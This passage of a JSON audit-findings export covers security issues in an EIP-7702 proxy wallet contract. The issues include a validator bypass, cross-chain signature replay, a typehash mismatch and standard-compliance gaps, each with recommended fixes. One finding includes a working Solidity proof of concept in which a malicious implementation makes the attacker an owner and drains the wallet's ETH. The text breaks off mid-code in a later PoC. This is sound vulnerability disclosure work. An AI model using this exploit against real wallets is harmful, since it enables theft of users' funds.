allowCrossChainReplay ? 0 : block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator\n        )\n    );\n\n    // Verify signature is from this address (the EOA)\n    address signer = ECDSA.recover(hash, signature);\n    if (signer != address(this)) revert InvalidSignature();\n\n+   // Add a function to AccountStateValidator to verify whether newImplementation is valid.\n+   if (IAccountStateValidator(validator).validateNewImplementation(newImplementation)) {\n+       revert InvalidImplementation();\n+   }\n\n    // Reset the implementation slot and call initialization if provided\n    ERC1967Utils.upgradeToAndCall(newImplementation, callData);\n\n    // Validate wallet state after upgrade, reverting if invalid\n    bytes4 validationResult =\n       IAccountStateValidator(validator).validateAccountState(address(this), ERC1967Utils.getImplementation());\n        \n    if (validationResult != ACCOUNT_STATE_VALIDATION_SUCCESS) revert InvalidValidation();\n}\n```"}, "help": {"text": "## **01. Summary**\n\nA vulnerability has been identified in the **`EIP7702Proxy`** contract that allows an attacker to bypass the **`AccountStateValidator`**. By exploiting the **`setImplementation`** function, an attacker can register a malicious implementation, perform unauthorized actions, and take control of the user's account. This vulnerability poses a significant risk to users' assets managed by the affected proxy contracts.\n\n## **02. Vulnerability Details**\n\nUsers of the **`EIP7702Proxy`** contract can register a new implementation by invoking the **`setImplementation`** function. This function utilizes a validator to verify the updated state and implementation. \n\n```solidity\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay\n) external {\n    // Construct hash using typehash to prevent signature collisions\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n            allowCrossChainReplay ? 0 : block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator\n        )\n    );\n\n    // Verify signature is from this address (the EOA)\n    address signer = ECDSA.recover(hash, signature);\n    if (signer != address(this)) revert InvalidSignature();\n\n    // Reset the implementation slot and call initialization if provided\n    ERC1967Utils.upgradeToAndCall(newImplementation, callData);\n\n    // Validate wallet state after upgrade, reverting if invalid\n    bytes4 validationResult =\n        IAccountStateValidator(validator).validateAccountState(address(this), ERC1967Utils.getImplementation());\n    if (validationResult != ACCOUNT_STATE_VALIDATION_SUCCESS) revert InvalidValidation();\n}\n```\n\nHowever, there is a way to bypass this validator. The verification process using the validator takes place after the upgradeToAndCall function is executed. As a result, if a malicious implementation is registered, it can perform harmful actions first, then appropriately update the account state and modify the implementation to bypass the validation.\n\nThe critical issue arises because the validator's verification happens post-upgrade, allowing the malicious implementation to manipulate the contract state and bypass necessary validations.\n\nAdditionally, the setImplementation function can also bypass the Validator\u2019s verification through reentrancy in the upgradeToAndCall function. However, in this case, the user would need to sign the malicious hash twice, making it difficult to exploit.\n\n## **03. Impact**\n\nIf this vulnerability is exploited, an attacker can steal all of a user's assets or execute any desired actions on the user's account, resulting in an extremely critical impact. However, to carry out such an attack, the user must sign a transaction authorizing the malicious implementation, which significantly reduces the likelihood to very low.\n\nDespite the low likelihood, the severity is considered medium because the AccountStateValidator responsible for verifying the account state and the newly registered implementation may not function correctly. This flaw can lead users to place undue trust in the validator, causing them to inadvertently sign hashes that include malicious implementations.\n\nAdditionally, since the protocol is a wallet protocol that can be widely adopted across multiple platforms, the presence of frontends provided by the protocol does not sufficiently mitigate the risk. This widespread usage increases the potential for the vulnerability to manifest, reinforcing the classification of this issue as having medium severity.\n\n## **04. Proof of Concept**\n\nThe following Proof of Concept (PoC) demonstrates how the vulnerability can be exploited. By deploying a malicious implementation and interacting with the **`setImplementation`** function, an attacker can drain the user's funds and take ownership of the account.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.23;\n\nimport {CoinbaseSmartWallet} from \"../lib/smart-wallet/src/CoinbaseSmartWallet.sol\";\n\nimport {EIP7702Proxy} from \"../src/EIP7702Proxy.sol\";\nimport {NonceTracker} from \"../src/NonceTracker.sol\";\nimport {DefaultReceiver} from \"../src/DefaultReceiver.sol\";\nimport {CoinbaseSmartWalletValidator} from \"../src/validators/CoinbaseSmartWalletValidator.sol\";\n\nimport {StorageSlot} from \"openzeppelin-contracts/contracts/utils/StorageSlot.sol\";\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\n\n/**\n * @title CoinbaseImplementationTest\n * @dev Tests specific to the CoinbaseSmartWallet implementation\n */\ncontract CoinbaseImplementationTest is Test {\n    uint256 constant _EOA_PRIVATE_KEY = 0xA11CE;\n    address payable _eoa;\n\n    uint256 constant _NEW_OWNER_PRIVATE_KEY = 0xB0B;\n    address payable _newOwner;\n\n    CoinbaseSmartWallet _wallet;\n    CoinbaseSmartWallet _cbswImplementation;\n\n    // core contracts\n    EIP7702Proxy _proxy;\n    NonceTracker _nonceTracker;\n    DefaultReceiver _receiver;\n    CoinbaseSmartWalletValidator _cbswValidator;\n\n    // constants\n    bytes4 constant ERC1271_MAGIC_VALUE = 0x1626ba7e;\n    bytes4 constant ERC1271_FAIL_VALUE = 0xffffffff;\n\n    /// @dev Storage slot with the address of the current implementation (ERC1967)\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    bytes32 _IMPLEMENTATION_SET_TYPEHASH = keccak256(\n        \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator)\"\n    );\n\n    function setUp() public virtual {\n        // Set up test accounts\n        _eoa = payable(vm.addr(_EOA_PRIVATE_KEY));\n        _newOwner = payable(vm.addr(_NEW_OWNER_PRIVATE_KEY));\n\n        // Deploy core contracts\n        _cbswImplementation = new CoinbaseSmartWallet();\n        _nonceTracker = new NonceTracker();\n        _receiver = new DefaultReceiver();\n        _cbswValidator = new CoinbaseSmartWalletValidator(_cbswImplementation);\n\n        // Deploy proxy with receiver and nonce tracker\n        _proxy = new EIP7702Proxy(address(_nonceTracker), address(_receiver));\n\n        // Get the proxy's runtime code\n        bytes memory proxyCode = address(_proxy).code;\n\n        // Etch the proxy code at the target address\n        vm.etch(_eoa, proxyCode);\n    }\n\n    // ======== PoC ========\n    function test_exploitValidatorBypass() public {\n\n        // 1. Fund EOA with 10 ETH\n        vm.deal(_eoa, 10 ether);\n        address attacker = makeAddr(\"attacker\");\n\n        emit log_named_decimal_uint(\"[Start] EOA ETH balance\", _eoa.balance, 18);\n        emit log_named_decimal_uint(\"[Start] Attacker ETH balance\", attacker.balance, 18);\n\n        // 2. Deploy malicious contract\n        MaliciousImpl maliciousImpl = new MaliciousImpl(address(_cbswImplementation), attacker);\n        \n        // 3. EOA sets a compromised implementation\n        // Despite using a trusted _cbswValidator, replacing the implementation with maliciousImpl does not revert.\n        bytes memory initArgs = _createInitArgs(_newOwner);\n        bytes memory signature = _signSetImplementationData(_EOA_PRIVATE_KEY, initArgs, address(maliciousImpl));\n\n        EIP7702Proxy(_eoa).setImplementation(\n            address(maliciousImpl),\n            initArgs,\n            address(_cbswValidator),\n            signature,\n            true\n        );\n\n        // 4. Attacker drains EOA\u2019s ETH and takes ownership\n        emit log_named_decimal_uint(\"[End] EOA ETH balance\", _eoa.balance, 18);\n        emit log_named_decimal_uint(\"[End] Attacker ETH balance\", attacker.balance, 18);\n\n        assertEq(true, CoinbaseSmartWallet(_eoa).isOwnerAddress(attacker));\n        console.log(\"Attacker now owns EOA\");\n\n        // Logs:\n        //     [Start] EOA ETH balance: 10.000000000000000000\n        //     [Start] Attacker ETH balance: 0.000000000000000000\n        //     [End] EOA ETH balance: 0.000000000000000000\n        //     [End] Attacker ETH balance: 10.000000000000000000\n    }\n\n    // ======== Utility Functions ========\n    /**\n     * @dev Creates initialization arguments for CoinbaseSmartWallet\n     * @param owner Address to set as the initial owner\n     * @return Encoded initialization arguments for CoinbaseSmartWallet\n     */\n    function _createInitArgs(address owner) internal pure returns (bytes memory) {\n        bytes[] memory owners = new bytes[](1);\n        owners[0] = abi.encode(owner);\n        bytes memory ownerArgs = abi.encode(owners);\n        return abi.encodePacked(CoinbaseSmartWallet.initialize.selector, ownerArgs);\n    }\n\n    /**\n     * @dev Signs initialization data for CoinbaseSmartWallet that will be verified by the proxy\n     * @param signerPk Private key of the signer\n     * @param initArgs Initialization arguments to sign\n     * @return Signature bytes\n     */\n    function _signSetImplementationData(uint256 signerPk, bytes memory initArgs, address implementation) internal view returns (bytes memory) {\n        bytes32 initHash = keccak256(\n            abi.encode(\n                _IMPLEMENTATION_SET_TYPEHASH,\n                0, // chainId 0 for cross-chain\n                _proxy,\n                _nonceTracker.nonces(_eoa),\n                _getERC1967Implementation(address(_eoa)),\n                implementation,\n                keccak256(initArgs),\n                address(_cbswValidator)\n            )\n        );\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, initHash);\n        return abi.encodePacked(r, s, v);\n    }\n\n    /**\n     * @dev Helper to read the implementation address from ERC1967 storage slot\n     * @param proxy Address of the proxy contract to read from\n     * @return The implementation address stored in the ERC1967 slot\n     */\n    function _getERC1967Implementation(address proxy) internal view returns (address) {\n        return address(uint160(uint256(vm.load(proxy, _IMPLEMENTATION_SLOT))));\n    }\n\n    /**\n     * @dev Helper to create ECDSA signatures\n     * @param pk Private key to sign with\n     * @param hash Message hash to sign\n     * @return signature Encoded signature bytes\n     */\n    function _sign(uint256 pk, bytes32 hash) internal pure returns (bytes memory signature) {\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);\n        return abi.encodePacked(r, s, v);\n    }\n\n}\n\ncontract MaliciousImpl {\n\n    struct MultiOwnableStorage {\n        uint256 nextOwnerIndex;\n        uint256 removedOwnersCount;\n        mapping(uint256 index => bytes owner) ownerAtIndex;\n        mapping(bytes bytes_ => bool isOwner_) isOwner;\n    }\n\n    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n    bytes32 private constant MUTLI_OWNABLE_STORAGE_LOCATION = 0x97e2c6aad4ce5d562ebfaa00db6b9e0fb66ea5d8162ed5b243f51a2e03086f00;\n\n    address immutable supportedImplementation;\n    address payable immutable attackerAddress;\n\n    constructor(address _supportedImplementation, address _attackerAddress) {\n        supportedImplementation = _supportedImplementation;\n        attackerAddress = payable(_attackerAddress);\n    }\n\n    function initialize(bytes[] calldata owners) external payable virtual {\n        evilExecute();\n        _setImplementation(supportedImplementation);\n    }\n\n    function evilExecute() public {\n        _addOwnerAtIndex(abi.encode(address(attackerAddress)));\n\n        (bool success, ) = attackerAddress.call{value: address(this).balance}(\"\");\n        require(success, \"failed evilExecute\");\n    }\n\n    function _addOwnerAtIndex(bytes memory owner) internal virtual {\n        MultiOwnableStorage storage $;\n\n        assembly (\"memory-safe\") {\n            $.slot := MUTLI_OWNABLE_STORAGE_LOCATION\n        }\n\n        $.isOwner[owner] = true;\n        $.ownerAtIndex[$.nextOwnerIndex] = owner;\n        $.nextOwnerIndex++;\n    }\n\n    function _setImplementation(address newImplementation) internal {\n        StorageSlot.AddressSlot storage $;\n\n        assembly (\"memory-safe\") {\n            $.slot := IMPLEMENTATION_SLOT\n        }\n\n        $.value = newImplementation;\n    }\n}\n```\n\nTo execute the PoC, place the above **`PoC.t.sol`** file in the **`/test`** directory and run the following command:\n\n```\n$ forge test --mt test_exploitValidatorBypass -vv\n\nRan 1 test for test/PoC.t.sol:CoinbaseImplementationTest\n[PASS] test_exploitValidatorBypass() (gas: 774399)\nLogs:\n  [Start] EOA ETH balance: 10.000000000000000000\n  [Start] Attacker ETH balance: 0.000000000000000000\n  [End] EOA ETH balance: 0.000000000000000000\n  [End] Attacker ETH balance: 10.000000000000000000\n  Attacker now owns EOA\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 19.88ms (6.89ms CPU time)\n```\n\nThe execution results demonstrate that the attacker successfully drained all ETH from the EOA and gained ownership of the wallet.\n\n## 05. **Tools Used**\n\nManual Code Review and Foundry\n\n## **06. Recommended Mitigation**\n\nTo mitigate this vulnerability, implement additional validation for the **`newImplementation`** address within the **`setImplementation`** function. This ensures that only trusted implementations can be registered, preventing unauthorized upgrades.\n\n```diff\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay\n) external {\n    // Construct hash using typehash to prevent signature collisions\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n            allowCrossChainReplay ? 0 : block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator\n        )\n    );\n\n    // Verify signature is from this address (the EOA)\n    address signer = ECDSA.recover(hash, signature);\n    if (signer != address(this)) revert InvalidSignature();\n\n+   // Add a function to AccountStateValidator to verify whether newImplementation is valid.\n+   if (IAccountStateValidator(validator).validateNewImplementation(newImplementation)) {\n+       revert InvalidImplementation();\n+   }\n\n    // Reset the implementation slot and call initialization if provided\n    ERC1967Utils.upgradeToAndCall(newImplementation, callData);\n\n    // Validate wallet state after upgrade, reverting if invalid\n    bytes4 validationResult =\n       IAccountStateValidator(validator).validateAccountState(address(this), ERC1967Utils.getImplementation());\n        \n    if (validationResult != ACCOUNT_STATE_VALIDATION_SUCCESS) revert InvalidValidation();\n}\n```"}, "helpUri": "https://cantina.xyz/code/b0a948cd-c861-4807-b36e-d680d82598bf/findings/28", "defaultConfiguration": {"level": "note"}}, {"id": "ecc6e1ee-d31c-4865-8922-6943877c689f", "name": "ChainAgnosticInitializationSignatureCreates", "shortDescription": {"text": "Chain-agnostic initialization signature creates backdoor by signing only contract addresses"}, "fullDescription": {"text": "## Summary\n\nSigning a chain agnostic payload assumes that `newImplementation` , `nonceTracker`, and `_receiver`, (and to a lesser extent `validator`), are all trusted by the user. This is fine in the case of a single chain since they can be trivially checked to be clearly safe. \n\nHowever, this cannot be assumed safe if designed to be replayed on other chains because these addresses can have malicious implementations on other chains.\n\n## Finding Description\n\nWhile it's possible that Coinbase will use safe deployment practices, it's both not guaranteed by the code, and the proxy is designed to be generic. **The generic chain-agnostic payload is unsafely signed.**\n\nSome examples of how the implementations could differ maliciously:\n1. One of these dependency contracts on the first chain could have been deployed via create instead of create2, allowing the deployer to use different code on other chains. \n2. The original addresses can be proxy addresses, and be under different control on the other chains.\n3. The chain can have built-in upgradability, and allow the deployer to update contracts. \n4. The chain can support metamorphic contracts (via non-6780 selfdestruct).\n5. Etc.. \n\nExample scenario:\n1. User signs a chain-agnostic EIP-7702 tuple and a chain-agnostic initialization payload.\n2. The deployer account that was used to deploy a honest **Implementation**, **NonceTracker**, or **DefaultReceiver** is compromized. Possibly long after it's no longer in active use.\n3. On another chain, a malicious **implementation**, or malicious **nonce tracker** (allowing replay), or malicious **default receiver** (allowing adding owners in storage prior to init) are deployed at the originally signed addresses. \n4. The auth tuple and init payload are replayed, allowing the user's funds to be compromized.\n5. Alternatively, even if the user has no funds on the other chain, since the EOA will be highjacked there, it may be able to originate cross chain messages that will compromize the EOA's funds on other chains.\n\n## Impact Explanation\n\nMalicious take over of users' EOAs. High impact.\n\n## Likelihood Explanation\n\nLow/Medium likelihood, but of several independent different scenarios.\n\nFor example, create (instead of create2) is what's currently used in the [the deployment script (separate branch)](https://github.com/base/eip-7702-proxy/blob/09bc6c797e99912ca0768cdafcb67252e2fdec59/scripts/Deploy.s.sol#L22-L33) for the same repo. All that's needed for the attack in that case, is that far in the future, someone gains access to the no-longer used private key that was used to broadcast the script originally.\n\n## Recommendation\n\n- Add the codehashes of `newImplementation`,  `nonceTracker`, `_receiver`,  `validator` into the payload, and add a warning about the potential dangers of contracts on other chains having different trust and immutability assumptions.\n- Alternatively, use a single factory to deploy all contracts trusted by the system (instead of linking already deployed contracts), sign off on the factory, and get the dependency addresses directly from the factory."}, "help": {"text": "## Summary\n\nSigning a chain agnostic payload assumes that `newImplementation` , `nonceTracker`, and `_receiver`, (and to a lesser extent `validator`), are all trusted by the user. This is fine in the case of a single chain since they can be trivially checked to be clearly safe. \n\nHowever, this cannot be assumed safe if designed to be replayed on other chains because these addresses can have malicious implementations on other chains.\n\n## Finding Description\n\nWhile it's possible that Coinbase will use safe deployment practices, it's both not guaranteed by the code, and the proxy is designed to be generic. **The generic chain-agnostic payload is unsafely signed.**\n\nSome examples of how the implementations could differ maliciously:\n1. One of these dependency contracts on the first chain could have been deployed via create instead of create2, allowing the deployer to use different code on other chains. \n2. The original addresses can be proxy addresses, and be under different control on the other chains.\n3. The chain can have built-in upgradability, and allow the deployer to update contracts. \n4. The chain can support metamorphic contracts (via non-6780 selfdestruct).\n5. Etc.. \n\nExample scenario:\n1. User signs a chain-agnostic EIP-7702 tuple and a chain-agnostic initialization payload.\n2. The deployer account that was used to deploy a honest **Implementation**, **NonceTracker**, or **DefaultReceiver** is compromized. Possibly long after it's no longer in active use.\n3. On another chain, a malicious **implementation**, or malicious **nonce tracker** (allowing replay), or malicious **default receiver** (allowing adding owners in storage prior to init) are deployed at the originally signed addresses. \n4. The auth tuple and init payload are replayed, allowing the user's funds to be compromized.\n5. Alternatively, even if the user has no funds on the other chain, since the EOA will be highjacked there, it may be able to originate cross chain messages that will compromize the EOA's funds on other chains.\n\n## Impact Explanation\n\nMalicious take over of users' EOAs. High impact.\n\n## Likelihood Explanation\n\nLow/Medium likelihood, but of several independent different scenarios.\n\nFor example, create (instead of create2) is what's currently used in the [the deployment script (separate branch)](https://github.com/base/eip-7702-proxy/blob/09bc6c797e99912ca0768cdafcb67252e2fdec59/scripts/Deploy.s.sol#L22-L33) for the same repo. All that's needed for the attack in that case, is that far in the future, someone gains access to the no-longer used private key that was used to broadcast the script originally.\n\n## Recommendation\n\n- Add the codehashes of `newImplementation`,  `nonceTracker`, `_receiver`,  `validator` into the payload, and add a warning about the potential dangers of contracts on other chains having different trust and immutability assumptions.\n- Alternatively, use a single factory to deploy all contracts trusted by the system (instead of linking already deployed contracts), sign off on the factory, and get the dependency addresses directly from the factory."}, "helpUri": "https://cantina.xyz/code/b0a948cd-c861-4807-b36e-d680d82598bf/findings/5", "defaultConfiguration": {"level": "error"}}]}}, "results": [{"ruleId": "c476f2b8-0ff5-4196-ad90-c0f988d26ce5", "level": "note", "message": {"text": "## Summary\nMissing event emission after critical setImplementation function invocation.\n\n## Finding Description\n\nThe setImplementation method of the EIP7702Proxy contract updates the underlying ERC-1967 implementation address, which is a significant operation affecting the proxy's core logic. However, this method currently lacks any event emission upon successful execution:\n\n```\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay\n) external {\n    // ... existing logic omitted for brevity ...\n\n    ERC1967Utils.upgradeToAndCall(newImplementation, callData);\n\n    bytes4 validationResult =\n        IAccountStateValidator(validator).validateAccountState(address(this), ERC1967Utils.getImplementation());\n    if (validationResult != ACCOUNT_STATE_VALIDATION_SUCCESS) revert InvalidValidation();\n    \n    // No event emitted here\n}\n```\n\nNot emitting events for critical actions like setting or upgrading implementations breaks transparency and auditability. Without event logs, off-chain monitoring tools or indexers cannot easily detect these critical changes, making it significantly harder for users or third-party services to verify and track the proxy\u2019s implementation history.\n\n## Recommendation\nEmit a dedicated event after successful execution of setImplementation."}, "locations": [{"physicalLocation": {"artifactLocation": {"uri": "README.md"}, "region": {"startLine": 1, "endLine": 1}}}], "partialFingerprints": {"primaryLocationLineHash": "c476f2b8-0ff5-4196-ad90-c0f988d26ce5-README-1"}}, {"ruleId": "d055a3d9-1379-427b-982e-363ca9cb15ff", "level": "warning", "message": {"text": "## Description\n\nThe EIP7702Proxy contract includes an `allowCrossChainReplay` parameter in its `setImplementation()` function that, when set to true, removes chain ID validation from signature verification. While this feature enables convenient cross-chain functionality, it introduces a potential security risk that users should be aware of.\n\nWhen users deploy the same proxy across multiple chains and enable cross-chain replay, they may inadvertently authorize implementation addresses that are predictably deployed via CREATE2/CREATE3 factories. An attacker could then deploy malicious code at the same address on another chain, and the signature authorizing the implementation would be valid across all chains where the proxy is deployed.\n\n```solidity\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay\n) external {\n    // Construct hash using typehash to prevent signature collisions\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n            allowCrossChainReplay ? 0 : block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator\n        )\n    );\n    // ...\n}\n```\n\n## Recommendation\n\nConsider one of the following approaches:\n\n1. Remove the `allowCrossChainReplay` option entirely, always including the chain ID in signature verification:\n\n```diff\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n-   bool allowCrossChainReplay\n) external {\n    // Construct hash using typehash to prevent signature collisions\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n-           allowCrossChainReplay ? 0 : block.chainid,\n+           block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator\n        )\n    );\n    // ...\n}\n```\n\n2. If cross-chain implementation setting must be supported, add clear documentation warning users about the potential risks and recommending they only use trusted implementations with strong security guarantees."}, "locations": [{"physicalLocation": {"artifactLocation": {"uri": "README.md"}, "region": {"startLine": 1, "endLine": 1}}}], "partialFingerprints": {"primaryLocationLineHash": "d055a3d9-1379-427b-982e-363ca9cb15ff-README-1"}}, {"ruleId": "6e05f421-dcb0-4de6-8784-0a7fbafc4a80", "level": "note", "message": {"text": "## Description\n\nThe second to last variable in the type hash definition is `bytes callData` ([EIP7702Proxy.sol#L27](https://github.com/base/eip-7702-proxy/blob/371a141ed738a0328b356092a8df1bed0e1d9856/src/EIP7702Proxy.sol#L27)), however the code uses `keccak256(callData)` ([EIP7702Proxy.sol#L87](https://github.com/base/eip-7702-proxy/blob/371a141ed738a0328b356092a8df1bed0e1d9856/src/EIP7702Proxy.sol#L87)), which returns a `bytes32` (see [Solidity's documentation](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#mathematical-and-cryptographic-functions)). As a result the typehash definition is incorrect\n\nThis does not have a direct impact on the smart contract, but can break third-party integration. In particular, given the large integration of coinbase's products, this can lead to breaking the user UI's verification of the signature and confuse the users\n\n## Recommendation\n\nChange `bytes callData` to `bytes32 callDataHash` in` _IMPLEMENTATION_SET_TYPEHASH`\n\n\n_(note: given the issue being straightforward, I did not provide a PoC, but I can if needed)_"}, "locations": [{"physicalLocation": {"artifactLocation": {"uri": "README.md"}, "region": {"startLine": 1, "endLine": 1}}}], "partialFingerprints": {"primaryLocationLineHash": "6e05f421-dcb0-4de6-8784-0a7fbafc4a80-README-1"}}, {"ruleId": "fcb149b5-dd5c-47d5-b17d-fdda7bf5fbc2", "level": "warning", "message": {"text": "## Summary\n\nA major motivation for [both EIP-7702](https://eips.ethereum.org/EIPS/eip-7702#forward-compatibility-with-future-account-abstraction) and [EIP-4337](https://eips.ethereum.org/EIPS/eip-4337#motivation) is to be maximally compliant with each other so that infrastructure and contracts will be used for both. EIP-7702 is intended primarily as a way to migrate EOA users to AA (EIP-4337). Indeed, the implementation intended to be used is the EIP-4337 CoinbaseSmartWallet, that relies on 4337 infrastructure for its functionality via `validateUserOp` etc.\n\nHowever, the current implementation of the **EIP7702Proxy** [is not compliant with the current version of EIP-4337](https://eips.ethereum.org/EIPS/eip-4337#eip-7702-delegated-smart-contract-accounts):\n\n> **All** EIP-7702 delegated Smart Contract Account implementations **MUST** check that **all** calls to the initialization function originate from the\u00a0`entryPoint.senderCreator()`\u00a0address.\n\n## Finding Description\n\nThis view and requirement are in the 0.8 [EntryPoint release notes](https://github.com/eth-infinitism/account-abstraction/releases). It is explained to be a mitigation of a griefing vector (for user and bundlers) of frontrunning the initialization: in this case frontrunning a `setImplementation` if it's intended as an `initCode` action by the bundler.\n\n## Impact Explanation\n\nLow impacts:\n1. The main impact is non-compliance with a **MUST** of the EIP-4337 infrastructure's requiements. This may cause this proxy and their users to be excluded from being served by AA infrastructure, and thus being excluded from bundling, sponsored transactions, paymasters, user op mempool propagation, etc.  As a result, the proxy won't serve its purpose (of proxying an ERC-4337 imlementation) in which case users will need to migrate to a different EIP-7702 delegation.\n2. The frontrunning vector itself can grief any relayer / bundler (whether 4337 or not), since anyone's call to `setImplementation` (done as `initCode`) will revert if frontrun.\n\n## Likelihood Explanation\n\nHigh likelihood (non compliance with 4337 infrastructure).\n\n## Recommendation\n\nUse a default value for entry point's address to get the `senderCreator` address in the proxy before initialization. After initialization, delegate the view to the implementation (like it's done with `isSignatureValid`)."}, "locations": [{"physicalLocation": {"artifactLocation": {"uri": "README.md"}, "region": {"startLine": 1, "endLine": 1}}}], "partialFingerprints": {"primaryLocationLineHash": "fcb149b5-dd5c-47d5-b17d-fdda7bf5fbc2-README-1"}}, {"ruleId": "832dd8ff-da0d-4dda-af97-fbb4a8502227", "level": "note", "message": {"text": "## Summary\nERC-223 token transfers to an EOA upgraded to a smart contract via EIP-7702 using the `EIP7702Proxy` will always revert because the proxy does not implement the required `tokenReceived` callback function, breaking compatibility with the ERC-223 standard and limiting token-handling capabilities post-upgrade.\n\n## Finding Description\nThe ERC-223 standard requires that any recipient running code\u2014whether a contract or an EOA with code\u2014implements the `tokenReceived` function to accept token transfers. This callback prevents accidental or incorrect deposits by ensuring the recipient can handle the tokens, as noted in discussions like [this Ethereum Magicians post](https://ethereum-magicians.org/t/eip-7702-set-eoa-account-code/19923/368). Without this function, an ERC-223 transfer reverts when the token contract attempts to call it.\nThe ERC-223 standard, as outlined in [EIP-223](https://github.com/ethereum/EIPs/issues/223), defines two `transfer` functions to enhance token transfer safety:\n1. `transfer(address _to, uint _value)`: A backwards-compatible version with ERC-20, which transfers tokens and invokes `tokenReceived(address, uint256, bytes)` on `_to` if it\u2019s a contract, reverting if the callback isn\u2019t implemented.\n2. `transfer(address _to, uint _value, bytes calldata _data)`: The primary function for ERC-223 transfers, which also invokes `tokenReceived` on `_to` if it\u2019s a contract, reverting if unimplemented, but skips the call if `_to` is an EOA (no code).\n\nPer the standard, a contract is identified by checking if `_to` has code (e.g., via `extcodesize`), and `tokenReceived` must be implemented by any contract recipient to accept tokens, preventing accidental deposits to incompatible contracts. If `_to` is an EOA (no code), the transfer proceeds without invoking `tokenReceived`.\n\n The proxy implements `onERC721Received` and `onERC1155Received` for ERC-721 and ERC-1155 compatibility but lacks `tokenReceived` for ERC-223. Post-upgrade, an EOA becomes a contract with code, so ERC-223 `transfer` calls will invoke `tokenReceived`. Since neither the proxy nor a typical implementation provides this function, the call fails, reverting the transfer.\n\nThis breaks the ERC-223 security guarantee that tokens are only sent to capable recipients. When an ERC-223 token contract executes a transfer:\n\nThe call to tokenReceived fails because neither the proxy nor a typical implementation includes it, causing the transfer to revert. This isn\u2019t an exploitable vulnerability but a compatibility gap that hinders the proxy\u2019s utility for ERC-223 token interactions post-EIP-7702 upgrade.\n\n## Impact Explanation\nThe absence of tokenReceived doesn\u2019t undermine the proxy\u2019s core security (initialization protection) or cause asset loss, but it prevents upgraded EOAs from receiving ERC-223 tokens via either transfer function when _to has code. This could disrupt wallet providers using EIP7702Proxy to upgrade EOAs into smart contract wallets, as users might expect support for ERC-223\u2014a standard designed for safer transfers. Post-Pectra, as EIP-7702 adoption grows, this gap could hinder interoperability with ERC-223 dApps, reducing the proxy\u2019s utility. It\u2019s not \u201cHigh\u201d impact since it\u2019s a compatibility issue, not a security flaw, but it\u2019s notable given the proxy\u2019s goal of enabling versatile wallets.\n\n## Likelihood Explanation\nWehn an EOA upgrades via EIP7702Proxy, it gains code, triggering the tokenReceived check in ERC-223 transfers. Without this callback, both transfer(address, uint) and transfer(address, uint, bytes) will revert when targeting the proxy. Given ERC-223\u2019s growing use for secure token handling and the proxy\u2019s intended role in smart contract wallets, this issue will likely manifest frequently post-upgrade, especially as wallet providers adopt EIP-7702.\n\n## Proof of Concept\n- Create a new `PoC.t.sol` file in the test folder and paste this\n```solidity\n    // SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.23;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {CoinbaseSmartWallet} from \"../lib/smart-wallet/src/CoinbaseSmartWallet.sol\";\nimport {EIP7702Proxy} from \"../src/EIP7702Proxy.sol\";\nimport {NonceTracker} from \"../src/NonceTracker.sol\";\nimport {DefaultReceiver} from \"../src/DefaultReceiver.sol\";\nimport {CoinbaseSmartWalletValidator} from \"../src/validators/CoinbaseSmartWalletValidator.sol\";\n\n// ERC-223 Token for testing\ncontract ERC223Token {\n    mapping(address => uint256) public balanceOf;\n\n    constructor() {\n        balanceOf[msg.sender] = 1000e18; // Mint initial supply\n    }\n\n    function transfer(address _to, uint _value, bytes calldata _data) public returns (bool) {\n        require(balanceOf[msg.sender] >= _value, \"Insufficient balance\");\n        if (_to.code.length > 0) {\n            (bool success, ) = _to.call(\n                abi.encodeWithSignature(\"tokenReceived(address,uint256,bytes)\", msg.sender, _value, _data)\n            );\n            require(success, \"Recipient rejected transfer\");\n        }\n        balanceOf[msg.sender] -= _value;\n        balanceOf[_to] += _value;\n        return true;\n    }\n\n    function transfer(address _to, uint _value) external returns (bool) {\n        require(balanceOf[msg.sender] >= _value, \"Insufficient balance\");\n        if (_to.code.length > 0) {\n            (bool success, ) = _to.call(\n                abi.encodeWithSignature(\"tokenReceived(address,uint256)\", msg.sender, _value)\n            );\n            require(success, \"Recipient rejected 